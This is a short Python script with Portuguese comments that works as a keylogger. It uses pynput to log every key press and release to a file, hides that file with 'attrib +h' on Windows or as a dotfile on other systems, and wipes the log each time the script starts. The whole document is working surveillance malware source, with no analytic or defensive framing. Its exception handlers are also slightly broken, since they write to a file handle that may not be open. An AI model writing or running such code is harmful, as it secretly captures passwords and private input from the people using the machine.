import os
from pynput.keyboard import Listener, Key
import platform

def get_key_file():
    if platform.system() == "Windows":
        
        arq = "key.txt"

        if not os.path.exists(arq):
            open(arq, "w").close()
            os.system(f"attrib +h {arq}")
        else:
            os.remove(arq) #Para resetar as informações toda vez que o computador for ligado e desligado
            open(arq, "w").close()
            os.system(f"attrib +h {arq}")
    else:
        arq = ".key.txt"
        if not os.path.exists(arq):
            open(arq, "w").close()
        else:
            os.remove(arq) #Para resetar as informações toda vez que o computador for ligado e desligado
            open(arq, "w").close()
    return arq

arq = get_key_file()

def pressionada(key):
    try:
        with open(arq, "a") as arquivo:
            arquivo.write(f"{key} foi pressionada\n")
    except Exception as e:
        arquivo.write(f"Erro ao gravar tecla pressionada: {e}")

def soltou(key):
    try:
        with open(arq,"a") as arquivo: # Usando "A" pois irá colocar ao final e não subscrever
            arquivo.write(f"{key} foi solto\n")
        '''if key == Key.esc:
            return False'''
            # Caso queira para o processo pressionando a tecla esc.
    except Exception as e:
        arquivo.write(f"Erro ao gravar tecla solta: {e}")
    

with Listener(on_press=pressionada, on_release=soltou) as listener:
    listener.join()
